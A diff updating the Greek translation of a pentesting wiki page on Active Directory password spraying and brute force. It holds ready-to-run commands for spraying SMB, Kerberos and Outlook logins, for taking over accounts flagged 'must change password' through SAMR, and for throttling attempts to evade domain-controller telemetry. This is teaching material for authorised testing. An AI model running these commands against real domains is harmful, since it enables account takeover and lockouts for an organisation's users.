@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Αφού βρείτε μερικά **valid usernames** μπορείτε να δοκιμάσετε τους πιο **common passwords** (έχοντας υπόψη την password policy του περιβάλλοντος)\ με κάθε έναν από τους ανακαλυφθέντες χρήστες.\
-Από **default** το **minimum** **password** **length** είναι **7**.
+Αφού βρείτε αρκετά **έγκυρα ονόματα χρήστη** μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς** (να έχετε υπόψη την πολιτική κωδικών του περιβάλλοντος) για κάθε έναν από τους εντοπισμένους χρήστες.\
+Κατά **προεπιλογή** το **ελάχιστο** **μήκος** **κωδικού** είναι **7**.
 
-Λίστες με **common usernames** μπορεί επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Λίστες με συνηθισμένα ονόματα χρήστη μπορεί επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Σημειώστε ότι **could lockout some accounts if you try several wrong passwords** (by default more than 10).
+Σημειώστε ότι **μπορεί να κλειδώσετε κάποιους λογαριασμούς αν δοκιμάσετε πολλούς λανθασμένους κωδικούς** (κατά προεπιλογή πάνω από 10).
 
 ### Get password policy
 
-Εάν έχετε κάποια user credentials ή ένα shell ως domain user μπορείτε να **get the password policy with**:
+Αν έχετε διαπιστευτήρια χρήστη ή ένα shell ως χρήστης του domain μπορείτε να **λάβετε την πολιτική κωδικών με**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -33,7 +33,7 @@ net accounts
 ```
 ### Exploitation από Linux (ή όλα)
 
-- Χρήση **crackmapexec:**
+- Χρησιμοποιώντας **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
@@ -47,11 +47,11 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να υποδείξετε τον αριθμό των προσπαθειών για να αποφύγετε τα lockouts):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(μπορείτε να καθορίσετε τον αριθμό προσπαθειών για να αποφύγετε αποκλεισμούς):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Χρησιμοποιώντας [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - Δεν συνιστάται — μερικές φορές δεν λειτουργεί
+- Χρησιμοποιώντας [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - ΔΕΝ ΣΥΝΙΣΤΑΤΑΙ, ΜΕΡΙΚΕΣ ΦΟΡΕΣ ΔΕΝ ΛΕΙΤΟΥΡΓΕΙ
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -60,7 +60,7 @@ python kerbrute.py -domain jurassic.park -users users.txt -password Password123 
 
 ![](<../../images/image (745).png>)
 
-- Χρησιμοποιώντας **rpcclient**:
+- Χρησιμοποιώντας το **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -69,7 +69,7 @@ done
 ```
 #### Από Windows
 
-- Με την έκδοση του [Rubeus](https://github.com/Zer1t0/Rubeus) με το brute module:
+- Με [Rubeus](https://github.com/Zer1t0/Rubeus) έκδοση που περιλαμβάνει το brute module:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,7 +77,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Με [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει users από το domain από προεπιλογή και θα παίρνει την password policy από το domain και θα περιορίζει τις προσπάθειες σύμφωνα με αυτή):
+- Με [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από το domain από προεπιλογή και θα ανακτήσει την πολιτική κωδικών από το domain και θα περιορίσει τις προσπάθειες ανάλογα με αυτή):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -85,12 +85,12 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-### Αναγνώριση και κατάληψη "Password must change at next logon" Accounts (SAMR)
+### Εντοπισμός και Κατάληψη λογαριασμών "Password must change at next logon" (SAMR)
 
-Μια low-noise τεχνική είναι να κάνετε spray ένα benign/empty password και να εντοπίσετε λογαριασμούς που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, που υποδεικνύει ότι ο κωδικός έχει εξαναγκαστεί σε λήξη και μπορεί να αλλάξει χωρίς να γνωρίζετε τον προηγούμενο.
+Μία τεχνική χαμηλού θορύβου είναι να κάνετε spray ένα benign/empty password και να εντοπίσετε λογαριασμούς που επιστρέφουν STATUS_PASSWORD_MUST_CHANGE, το οποίο υποδεικνύει ότι το password εξαναγκάστηκε να λήξει και μπορεί να αλλάξει χωρίς να γνωρίζετε το παλιό.
 
 Workflow:
-- Καταγράψτε τους χρήστες (RID brute via SAMR) για να δημιουργήσετε τη λίστα στόχων:
+- Εντοπίστε χρήστες (RID brute via SAMR) για να δημιουργήσετε τη λίστα στόχων:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -99,12 +99,12 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Spray ένα κενό password και συνέχισε στις hits για να αποκτήσεις accounts που πρέπει να αλλάξουν στο επόμενο logon:
+- Spray an empty password και συνεχίστε με τα hits για να αποκτήσετε πρόσβαση σε λογαριασμούς που πρέπει να αλλάξουν στο next logon:
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- Για κάθε hit, αλλάξτε τον κωδικό πρόσβασης μέσω SAMR με το NetExec’s module (δεν απαιτείται ο παλιός κωδικός όταν το "must change" είναι ενεργοποιημένο):
+- Για κάθε hit, αλλάξτε τον κωδικό μέσω SAMR με το NetExec’s module (δεν απαιτείται ο παλιός κωδικός όταν έχει οριστεί το "must change"):
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -114,8 +114,8 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 Λειτουργικές σημειώσεις:
-- Βεβαιώσου ότι το host σου έχει συγχρονισμένη ώρα με τον DC πριν από λειτουργίες που βασίζονται σε Kerberos: `sudo ntpdate <dc_fqdn>`.
-- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ., RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα αλλά ο λογαριασμός δεν διαθέτει δικαιώματα διαδραστικής σύνδεσης.
+- Βεβαιωθείτε ότι το ρολόι του host σας είναι συγχρονισμένο με τον DC πριν από τις Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
+- Ένα [+] χωρίς (Pwn3d!) σε ορισμένα modules (π.χ., RDP/WinRM) σημαίνει ότι τα creds είναι έγκυρα αλλά ο λογαριασμός δεν έχει δικαιώματα διαδραστικής σύνδεσης.
 
 ## Brute Force
 ```bash
@@ -123,7 +123,7 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 ```
 ### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Το Kerberos pre-auth–based spraying μειώνει τον θόρυβο σε σχέση με SMB/NTLM/LDAP bind attempts και ευθυγραμμίζεται καλύτερα με τις AD lockout policies. Το SpearSpray συνδυάζει LDAP-driven targeting, έναν pattern engine και policy awareness (domain policy + PSOs + badPwdCount buffer) για να πραγματοποιεί spraying με ακρίβεια και ασφάλεια. Μπορεί επίσης να tag compromised principals στο Neo4j για BloodHound pathing.
+Kerberos pre-auth–based spraying μειώνει τον θόρυβο σε σχέση με τις προσπάθειες bind SMB/NTLM/LDAP και συμμορφώνεται καλύτερα με τις πολιτικές lockout του AD. Το SpearSpray συνδυάζει LDAP-driven targeting, έναν pattern engine και ευαισθητοποίηση πολιτικών (domain policy + PSOs + badPwdCount buffer) για να πραγματοποιεί spray με ακρίβεια και ασφάλεια. Μπορεί επίσης να επισημάνει παραβιασμένους principals στο Neo4j για pathing του BloodHound.
 
 Key ideas:
 - LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
@@ -144,7 +144,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-Στόχευση και έλεγχος μοτίβων:
+Στόχευση και έλεγχος προτύπων:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -153,7 +153,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Έλεγχοι απόκρυψης και ασφάλειας:
+Stealth και έλεγχοι ασφάλειας:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -176,27 +176,27 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 ```
 Available variables include:
 - {name}, {samaccountname}
-- Χρονικά από το pwdLastSet κάθε χρήστη (ή whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Βοηθήματα σύνθεσης και org token: {separator}, {suffix}, {extra}
+- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Composition helpers and org token: {separator}, {suffix}, {extra}
 
 Operational notes:
-- Προτιμήστε να κάνετε query τον PDC-emulator με -dc για να διαβάσετε το πιο αξιόπιστο badPwdCount και πληροφορίες σχετικές με policy.
-- Οι resets του badPwdCount ενεργοποιούνται στην επόμενη προσπάθεια μετά το observation window· χρησιμοποιήστε threshold και timing για να παραμείνετε ασφαλείς.
-- Οι Kerberos pre-auth προσπάθειες εμφανίζονται ως 4768/4771 στη DC telemetry· χρησιμοποιήστε jitter και rate-limiting για να μη ξεχωρίζετε.
+- Προτιμήστε το query στον PDC-emulator με -dc για να διαβάσετε το πιο αξιόπιστο badPwdCount και πληροφορίες σχετικές με πολιτικές.
+- Οι επαναφορές του badPwdCount ενεργοποιούνται στην επόμενη προσπάθεια μετά το παράθυρο παρατήρησης· χρησιμοποιήστε όριο και χρονισμό για να παραμείνετε ασφαλείς.
+- Οι προσπάθειες pre-auth του Kerberos εμφανίζονται ως 4768/4771 στην DC telemetry· χρησιμοποιήστε jitter και rate-limiting για να περάσετε απαρατήρητοι.
 
-> Συμβουλή: Το default LDAP page size του SpearSpray είναι 200· προσαρμόστε με -lps αν χρειαστεί.
+> Tip: Το προεπιλεγμένο LDAP page size του SpearSpray είναι 200· προσαρμόστε με -lps αν χρειάζεται.
 
 ## Outlook Web Access
 
-Υπάρχουν πολλά εργαλεία για password spraying στο Outlook.
+Υπάρχουν πολλαπλά εργαλεία για p**assword spraying outlook**.
 
 - Με [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- Με [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- με [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
 - Με [Ruler](https://github.com/sensepost/ruler) (αξιόπιστο!)
 - Με [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Με [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και ένα password / μια μικρή λίστα passwords για να κάνετε password spraying.
+Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό / μια μικρή λίστα κωδικών για να κάνετε spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
